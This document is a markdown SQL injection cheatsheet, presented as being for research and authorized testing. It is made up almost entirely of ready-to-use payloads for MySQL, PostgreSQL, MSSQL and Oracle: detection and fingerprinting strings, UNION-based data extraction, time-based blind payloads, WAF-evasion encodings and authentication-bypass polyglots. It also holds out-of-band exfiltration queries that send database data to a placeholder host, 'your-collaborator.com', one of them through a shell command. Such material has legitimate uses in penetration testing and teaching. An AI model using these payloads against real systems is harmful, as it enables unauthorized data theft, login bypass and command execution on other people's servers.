# 💉 SQL Injection (SQLi) Research Cheatsheet

> **⚠️ Research & Authorized Testing Only:** SQL injection can cause data loss or service outages. Always verify `WHERE` clauses before running `UPDATE` or `DELETE` statements.

---

## 🔍 1. Detection & Fingerprinting

*Determine if the parameter is vulnerable and which database is running backend.*

### Universal Error Triggers

*Inject these characters to break the SQL syntax.*

```sql
'
"
`
')
")
;
--
\   (MySQL specific, escapes the next quote)

```

### Logical Verification (Boolean)

*If the page content changes between True and False, it is vulnerable.*

```sql
-- Integer Injection
id=1 AND 1=1  (True - Page loads normally)
id=1 AND 1=2  (False - Page missing content/404)

-- String Injection
id=1' AND '1'='1
id=1' AND '1'='0

-- Mathematical (Bypass Quotes)
id=1-0  (Should stay 1)
id=1-1  (Should become 0/Error)

```

### Database Fingerprinting

*Identify the DB to tailor your payloads.*

| Database | Version Query | String Concat | Comments |
| --- | --- | --- | --- |
| **MySQL** | `SELECT @@version` | `CONCAT(a,b)` or `a b` | `#`, `-- ` (space needed) |
| **PostgreSQL** | `SELECT version()` | `a || b` | `--` |
| **MSSQL** | `SELECT @@version` | `a + b` | `--` |
| **Oracle** | `SELECT banner FROM v$version` | `a || b` | `--` |

---

## ⛓️ 2. UNION Based Injection

*Used when the application displays the output of the query on the page.*

### Step 1: Determine Column Count

*Increment the number until the application returns an error.*

```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
...

```

### Step 2: Find the Data Echo Point

*Once you know the column count (e.g., 3), identify which column is displayed.*

```sql
-- MySQL / PostgreSQL
UNION SELECT 1, 2, 3--
UNION SELECT 'a', 'b', 'c'--  (If types are strict)

-- MSSQL / Oracle (Strict typing requires NULLs)
UNION SELECT NULL, NULL, NULL--

```

### Step 3: Extract Data

*Replace the echoing number (e.g., '2') with system commands.*

```sql
UNION SELECT 1, @@version, 3--
UNION SELECT 1, user(), 3--
UNION SELECT 1, table_name, 3 FROM information_schema.tables--

```

---

## ⏳ 3. Blind SQL Injection

*Used when no errors or data are returned. You rely on server behavior (delays).*

### Time-Based Payloads (The "Sleep" Test)

**MySQL**

```sql
1' AND SLEEP(5)--
1' AND BENCHMARK(1000000,MD5(1))--

```

**PostgreSQL**

```sql
1' || pg_sleep(5)--
1' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

```

**MSSQL**

```sql
1'; WAITFOR DELAY '0:0:5'--

```

**Oracle**

```sql
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--

```

---

## 📡 4. Out-of-Band (OOB) Exfiltration

*Used when you can't see the output, but the server can make external network requests (DNS/HTTP).*
*Requires a listener (e.g., Burp Collaborator, Interactsh).*

**MySQL (Windows Only - UNC Path)**

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT version()), '.your-collaborator.com\\foobar'));

```

**PostgreSQL (COPY Command)**

```sql
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).your-collaborator.com';

```

**MSSQL (xp_dirtree)**

```sql
DECLARE @v VARCHAR(1024);
SELECT @v = (SELECT @@version); 
EXEC('master..xp_dirtree "\\'+@v+'.your-collaborator.com\foo"');

```

**Oracle (UTL_HTTP)**

```sql
SELECT UTL_HTTP.REQUEST('http://your-collaborator.com/'||(SELECT banner FROM v$version)) FROM DUAL;

```

---

## 🛡️ 5. WAF Bypass & Evasion

*Techniques to slip past filters blocking "UNION" or "SELECT".*

### Case & Comments

```sql
UnIoN/**/SeLeCt
SEL/**/ECT

```

### Whitespace Alternatives

*If spaces are blocked, use tabs, newlines, or parenthesis.*

```sql
%09 (Tab)
%0A (Newline)
/*comments*/
UNION(SELECT(1),2,3)

```

### Encoding

```sql
-- Hex Encoding (Bypasses quotes)
SELECT * FROM users WHERE name = 0x61646D696E  (Hex for 'admin')

-- URL Double Encoding
%2555NION %2553ELECT

```

---

## 🗄️ 6. Useful System Tables (Mapping the DB)

*Where to look for the "flag" or user data.*

**MySQL / PostgreSQL / MSSQL**

```sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'

```

**Oracle**

```sql
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS'

```

---

## 🛠️ 7. Cheat-Sheet: Payload Polyglots

*Try these "one-shot" strings to detect vulnerabilities across different engines.*

**The "Sleeper" Polyglot (Time-Based)**

```sql
SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/

```

**The Generic Error Polyglot**

```text
' " \ ; -- /*

```

**Authentication Bypass Polyglot**

```sql
or true--
" or true--
' or true--
") or true--
') or true--

```
